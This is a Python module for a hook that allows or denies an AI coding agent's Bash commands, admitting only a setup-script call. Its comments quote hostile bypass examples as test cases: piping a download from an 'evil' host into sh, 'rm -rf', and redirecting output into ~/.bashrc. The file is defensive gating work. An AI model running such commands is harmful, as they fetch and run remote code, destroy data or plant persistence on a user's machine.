#!/usr/bin/env python3
"""Bash-command matching for ``codex_pretooluse_gate.py`` (R2 — AC1a).

Split out of ``codex_pretooluse_gate.py`` (bloat gate, 2026-09-22) — that
module owns the hook's I/O, runtime discriminator, and activation-record
wiring; this one owns the pure allow/deny matching logic for a ``Bash``-
class tool call. See that module's own docstring for the full allow/deny
matrix and threat-model notes."""

from __future__ import annotations

import shlex
import sys
from pathlib import Path

_SETUP_SCRIPT_BASENAME = "setup_iterate_worktree.py"
_SHELL_OPERATORS = ("&&", "||", ";", "|", "&")
_RUN_WRAPPERS = ("uv",)  # `uv run <target>`
_INTERPRETER_WRAPPERS = ("python", "python3", "py")  # `<interp> <target>`
#: Known ``uv run`` flags that consume a following value token, so that
#: token is never mistaken for the target script (external review, glm
#: medium: ``uv run --project-root . setup_iterate_worktree.py`` was falsely
#: DENIED because the loop below skipped the flag token but not its value,
#: leaving ``.`` in the target position). Value-less flags (``--no-sync``,
#: ``--offline``, ...) need no entry here — the existing "skip -prefixed
#: tokens" loop already handles those.
_UV_RUN_VALUE_FLAGS = (
    "--project", "--project-root", "--directory", "-C",
    "--python", "-p", "--with", "--extra", "--index", "--index-url",
    "--find-links", "--env-file",
)
# Command substitution and multi-statement smuggling that no amount of
# segment/operator tokenizing can make safe to allow through, even when a
# match happens to land in the last segment (code review, medium): a
# newline is a statement separator no shlex mode reports as a token, and
# `$(...)`/`` `...` `` runs arbitrary content inline within a single word.
_UNSAFE_SUBSTRINGS = ("\n", "\r", "$(", "`")
#: Redirection/grouping tokens ``punctuation_chars=True`` also lexes as
#: their own tokens, same as the shell operators above (external review,
#: glm medium: these were never checked, so ``uv run
#: setup_iterate_worktree.py > ~/.bashrc`` stayed a single matching segment
#: and was wrongly ALLOWED — redirection writes to an arbitrary path
#: without needing a second command, so it denies outright like ``|``/``||``
#: rather than merely acting as a segment separator).
_REDIRECTION_OR_GROUPING = (">", "<", ">>", "<<", "(", ")")


def _unquote(token: str) -> str:
    """Strip one matching pair of leading/trailing quote characters.
    ``shlex.split(..., posix=False)`` (used on Windows — see
    ``_bash_command_matches_setup``) deliberately does NOT strip quotes the
    way POSIX mode does, so a quoted path token like
    ``"C:\\...\\setup_iterate_worktree.py"`` otherwise keeps its literal
    trailing ``"`` — corrupting ``Path(token).name`` into
    ``setup_iterate_worktree.py"`` and silently denying a legitimate
    invocation. A no-op on POSIX (its tokens are already unquoted)."""
    if len(token) >= 2 and token[0] == token[-1] and token[0] in ('"', "'"):
        return token[1:-1]
    return token


def _segments(tokens: list[str]) -> list[list[str]]:
    """Split a shlex'd token list on unquoted shell control operators
    (``&&``, ``||``, ``;``, ``|``, ``&``) into command segments. The caller
    tokenizes with ``punctuation_chars=True`` (code review, medium), so an
    operator glued to an adjacent word without surrounding whitespace
    (``cmd1&&cmd2``, ``uv run setup.py &curl evil.sh``) still arrives here
    as its own token — an earlier plain-``shlex.split`` version only split
    an operator that was already whitespace-separated, which let a
    same-segment trailing command through unnoticed on a match."""
    segments: list[list[str]] = []
    current: list[str] = []
    for token in tokens:
        if token in _SHELL_OPERATORS:
            if current:
                segments.append(current)
            current = []
        else:
            current.append(token)
    if current:
        segments.append(current)
    return segments


def _segment_targets_setup(segment: list[str]) -> bool:
    """True iff this segment's actual invoked program — not merely one of
    its arguments — is ``setup_iterate_worktree.py``, directly or through a
    ``uv run``/interpreter wrapper. Deliberately rejects
    ``echo setup_iterate_worktree.py`` (program is ``echo``; the script name
    is just an argument) and accepts ``cd <root> && uv run
    setup_iterate_worktree.py`` (the SECOND segment's program, through the
    ``uv run`` wrapper, is the script) — the two named false-positive/
    false-negative traps."""
    if not segment:
        return False
    # Basename-only match, not path/identity-verified: a script anywhere on
    # disk literally named ``setup_iterate_worktree.py`` would also satisfy
    # this. Accepted residual risk (code-reviewer finding, medium) -- this
    # gate's threat model is guiding a cooperative session, not defending
    # against one actively trying to evade it, and the whole mechanism is
    # fail-open by design already; consistent with R0/R1b's other
    # cooperative-enforcement choices. Not fixed here on purpose. Same
    # acceptance covers trailing tokens after the match position within this
    # segment (e.g. a redirection or extra flag) -- it can't smuggle a SECOND
    # command past the gate (that still needs a shell operator, already
    # denied by the caller), so it's the same cooperative-enforcement
    # boundary, not a new bypass class (code-reviewer finding, low, round 2).
    program = Path(segment[0]).name
    if program == _SETUP_SCRIPT_BASENAME:
        return True
    rest = segment[1:]
    if program in _RUN_WRAPPERS:
        idx = 0
        if idx < len(rest) and rest[idx] == "run":
            idx += 1
        while idx < len(rest) and rest[idx].startswith("-") and rest[idx] != "--":
            flag = rest[idx]
            idx += 1
            if flag in _UV_RUN_VALUE_FLAGS and idx < len(rest):
                idx += 1  # also consume this flag's value token
        if idx < len(rest) and rest[idx] == "--":
            idx += 1
        return idx < len(rest) and Path(rest[idx]).name == _SETUP_SCRIPT_BASENAME
    if program in _INTERPRETER_WRAPPERS:
        idx = 0
        while idx < len(rest) and rest[idx].startswith("-"):
            idx += 1
        return idx < len(rest) and Path(rest[idx]).name == _SETUP_SCRIPT_BASENAME
    return False


def _is_bare_cd(segment: list[str]) -> bool:
    """True iff this segment is exactly a bare ``cd <path>`` call and
    nothing else — the only shape allowed to precede the mandated setup
    invocation in a sequential chain (see ``_bash_command_matches_setup``)."""
    return len(segment) == 2 and segment[0] == "cd"


def _bash_command_matches_setup(tool_input: object) -> bool:
    """Tokenize (shlex) a ``Bash``-class call's command and check whether it
    invokes ``setup_iterate_worktree.py`` as its ONLY semantically active
    step — never a raw substring match, and never merely ``any()`` segment
    matching (code-reviewer finding, high: an earlier version of this
    function allowed any compound command containing a matching segment
    anywhere, e.g. ``rm -rf x && uv run setup_iterate_worktree.py`` or
    ``uv run setup_iterate_worktree.py && curl evil | sh`` — smuggling
    arbitrary other commands past the gate on the one call it's supposed to
    isolate). Allowed shapes, matching the two named false-positive/
    false-negative traps plus the fix: (a) a single segment (no shell
    operators at all) that matches; (b) a sequential ``&&``/``;`` chain
    where every segment before the last is a bare ``cd <path>`` (see
    ``_is_bare_cd``) and the LAST segment matches. Any ``||`` or ``|``
    anywhere in the command denies outright, regardless of match position —
    a disjunction or pipe can run other content unconditionally alongside
    or instead of the setup call, so no shape check can make it safe.
    ``posix`` mode is platform-gated: POSIX shlex treats backslash as an
    escape character, which corrupts a literal Windows path
    (``C:\\Users\\...\\setup_iterate_worktree.py``) — this codebase already
    paid for that exact class of Windows-quoting mistake once (R1b).
    Tokenizing sets ``punctuation_chars=True`` (code review, medium) so a
    shell operator glued to an adjacent word without surrounding whitespace
    (``uv run setup.py &curl evil.sh``) still lexes as its own token instead
    of merging into one opaque, unmatched blob — the previous plain
    ``shlex.split`` only split an operator that already arrived
    whitespace-separated, which is exactly what let a same-segment trailing
    command through unnoticed on the one class this function does match."""
    if not isinstance(tool_input, dict):
        return False
    command = tool_input.get("command")
    if not isinstance(command, str) or not command.strip():
        return False
    if any(marker in command for marker in _UNSAFE_SUBSTRINGS):
        return False
    try:
        lexer = shlex.shlex(command, posix=(sys.platform != "win32"), punctuation_chars=True)
        lexer.whitespace_split = True
        tokens = list(lexer)
    except ValueError:
        return False
    tokens = [_unquote(t) for t in tokens]
    if "||" in tokens or "|" in tokens:
        return False
    if any(t in _REDIRECTION_OR_GROUPING for t in tokens):
        return False
    segments = _segments(tokens)
    if not segments:
        return False
    if len(segments) == 1:
        return _segment_targets_setup(segments[0])
    *prefix, last = segments
    return _segment_targets_setup(last) and all(_is_bare_cd(seg) for seg in prefix)


def decide(tool_name: object, tool_input: object) -> bool:
    """True = allow. Only reachable for the session's one settled-flag-
    consuming call; every other call in the session never reaches this
    function (fail-open / already-settled short-circuits before it)."""
    if tool_name == "Bash":
        return _bash_command_matches_setup(tool_input)
    return False  # unrecognized/other local-tool class: deny by default
